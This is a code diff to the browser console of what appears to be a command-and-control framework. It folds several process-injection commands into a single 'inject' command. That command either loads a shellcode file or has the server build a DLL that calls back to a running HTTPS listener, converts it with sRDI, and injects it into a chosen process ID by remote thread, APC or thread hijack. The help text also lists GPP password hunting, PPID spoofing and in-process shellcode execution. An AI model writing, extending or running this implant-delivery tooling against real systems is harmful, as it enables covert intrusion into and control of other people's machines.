@@ -11049,9 +11049,7 @@ ${isWin ? `
   gpp-hunt                           hunt GPP passwords across all domain SYSVOL shares
 
 <span class="console-section">INJECTION / EXECUTION</span>
-  inject &lt;pid&gt; [remote|apc|hijack]  build C DLL → sRDI shellcode → inject into PID (default: remote)
-  inject &lt;pid&gt; &lt;sc.bin&gt;             classic injection: WriteProcessMemory + CreateRemoteThread
-  inject-apc &lt;sc.bin&gt; [proc]        APC early-bird: spawn [proc] suspended, inject, resume
+  inject &lt;pid&gt; [remote|apc|hijack] [sc.bin]  auto-build C DLL or use sc.bin → inject into PID
   forkrun &lt;sc.bin&gt; [proc]           PPID-spoof + section map + thread hijack in sacrificial process
   thread-hijack &lt;pid&gt; &lt;sc.bin&gt;     section map + patch RIP of existing thread (no CreateRemoteThread)
   stage2 &lt;sc.bin&gt;                   in-process CreateThread (no new process)
@@ -12534,28 +12532,39 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'rev2self': taskType='REV2SELF'; break;
     case 'getsystem': taskType='GETSYSTEM'; break;
-    case 'inject': {
-      // inject <pid> [remote|apc|hijack]
-      // Builds C DLL with current HTTPS listener, converts to sRDI, injects into PID
+    case 'inject': case 'inject-remote': {
+      // inject <pid> [remote|apc|hijack] [sc.bin]
+      //   no sc.bin  → auto-build C DLL → sRDI → inject
+      //   with sc.bin → use pre-built shellcode file
       const parts = args.trim().split(/\s+/);
       const pid = parseInt(parts[0], 10);
-      if (!pid) { addConsoleOutput('', 'usage: inject <pid> [remote|apc|hijack]', null); return; }
-      const method = (parts[1] || 'remote').toLowerCase();
-      if (!['remote','apc','hijack'].includes(method)) {
-        addConsoleOutput('', 'inject method must be remote, apc, or hijack', null); return;
+      if (!pid) { addConsoleOutput('', 'usage: inject <pid> [remote|apc|hijack] [sc.bin]', null); return; }
+      const METHODS = ['remote','apc','hijack'];
+      // Find method and optional sc.bin in remaining args
+      let method = 'remote', scFile = null;
+      for (let i = 1; i < parts.length; i++) {
+        if (METHODS.includes(parts[i].toLowerCase())) method = parts[i].toLowerCase();
+        else if (parts[i]) scFile = parts[i];
       }
-      // Pick the first running HTTPS listener to get the server URL
+      const typeMap = {remote:'INJECT_REMOTE', apc:'INJECT_APC', hijack:'THREAD_HIJACK'};
+      if (scFile) {
+        // File-based: use pre-built shellcode
+        try {
+          const sc = await fetchSCFile(scFile);
+          payload = u8ToB64(sc);
+          taskType = typeMap[method];
+          taskArgs = JSON.stringify({pid});
+        } catch(e) { addConsoleOutput('', e.message, null); return; }
+        break;
+      }
+      // Auto-build: build C DLL on server → sRDI → inject
       let serverURL = '';
       try {
         const jobs = await api('GET', '/api/jobs');
         const httpsJob = (jobs?.data || []).find(j => j.protocol === 'HTTPS' && j.status === 'running');
-        if (httpsJob) {
-          // Derive server URL from the current page host (same machine) + HTTPS port
-          const host = window.location.hostname;
-          serverURL = `https://${host}:${httpsJob.port}`;
-        }
+        if (httpsJob) serverURL = `https://${window.location.hostname}:${httpsJob.port}`;
       } catch(_) {}
-      if (!serverURL) { addConsoleOutput('', 'no running HTTPS listener found — start one first', null); return; }
+      if (!serverURL) { addConsoleOutput('', 'no running HTTPS listener — start one first', null); return; }
       addConsoleOutput(`[*] building C DLL → sRDI → inject PID ${pid} (${method}) via ${serverURL}…`, '', null);
       const r2 = await api('POST', `/api/agents/${agentID}/inject`, {
         pid, method, server_url: serverURL, transport: 'https', sleep_sec: 60, jitter_pct: 20
@@ -12873,28 +12882,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'inject-apc': {
-      const parts5 = args.split(' ');
-      if (!parts5[0]) { addConsoleOutput('usage: inject-apc <shellcode.bin> [process]', '', null); return; }
-      try {
-        const sc = await fetchSCFile(parts5[0]);
-        payload = u8ToB64(sc);
-        taskType = 'INJECT_APC';
-        taskArgs = parts5.slice(1).join(' ');
-      } catch(e) { addConsoleOutput('', e.message, null); return; }
-      break;
-    }
-    case 'inject': {
-      // inject <pid> <shellcode.bin>
-      const parts6 = args.split(' ');
-      if (parts6.length < 2) { addConsoleOutput('usage: inject <pid> <shellcode.bin>', '', null); return; }
-      const pid = parts6[0];
-      try {
-        const sc = await fetchSCFile(parts6[1]);
-        payload = u8ToB64(sc);
-        taskType = 'INJECT_REMOTE';
-        taskArgs = JSON.stringify({pid: parseInt(pid, 10)});
-      } catch(e) { addConsoleOutput('', e.message, null); return; }
-      break;
+      // Unified into `inject <pid> apc [sc.bin]` — redirect with hint
+      addConsoleOutput('', 'use: inject <pid> apc [sc.bin]  (inject-apc is deprecated)', null); return;
     }
     case 'stage2': {
       // stage2 <shellcode.bin>
